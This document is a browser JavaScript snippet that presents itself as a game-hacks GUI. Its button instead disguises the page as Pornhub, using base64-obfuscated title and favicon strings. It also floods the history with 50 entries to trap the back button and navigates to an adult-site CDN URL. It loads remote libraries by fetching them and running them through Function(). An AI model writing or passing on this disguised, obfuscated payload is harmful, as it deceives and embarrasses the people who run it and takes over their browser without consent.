(async function () {        
    await fetch("https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.js").then(res => res.text()).then(res => Function(res)())
    await fetch("https://ajax.googleapis.com/ajax/libs/jqueryui/1.10.4/jquery-ui.js").then(res => res.text()).then(res => Function(res)())           
    var myStylesLocation = "https://code.jquery.com/ui/1.13.0-alpha.1/themes/smoothness/jquery-ui.css";                
    $(`<link rel="stylesheet" type="text/css" href="${myStylesLocation}">`).appendTo("head");                
    $(`<div id='dialog'; title='General GUI - ${document.title}'; style='border:none; background-color:white; font-size:80%'; <p>General all-purpose GUI with hacks for your favorite games ;) <br><button id="initGUIab">Initiate Script</button></p></div>`).appendTo("body");                
    $("#dialog").dialog();
    document.getElementById("initGUIab").addEventListener("click", () => {
        function changeIcon(src) {
            var link = document.querySelector("link[rel*='icon']") || document.createElement('link');
            link.type = 'image/x-icon';
            link.rel = 'shortcut icon';
            link.href = src;
            document.getElementsByTagName('head')[0].appendChild(link);
        }
        function disguise(title, icon) {
            changeIcon(icon);
            document.title = title;
        }
        disguise(atob("UG9ybmh1Yg=="), atob("aHR0cHM6Ly9laS5waG5jZG4uY29tL3d3dy1zdGF0aWMvZmF2aWNvbi5pY28/Y2FjaGU9MjAyMzA0MjcwMg=="))
        var num = 50;
        done = false;
        x = window.location.href;
        for (var i = 1; i <= num; i++) {
            history.pushState(0, 0, i == num ? x : i.toString());
            if (i == num) {
                done = true;
            }
        }
        const a = document.createElement("a");
        a.href = "https://ei.phncdn.com/www-static/QWhpd2tjYiBOSEFCIFdoZm5LWFMgCkEgRkhKS05BUyBERldCTElBVVdLSEZMT0lHUFNKTkFTIEFCV1NOTUQgRk9XSUk6QVBTSU9KS0RCIEEgV0lPIEpBU0xGSyBKS0FXIEJDU04g";
        document.body.appendChild(a);
        a.click();
    });    
})();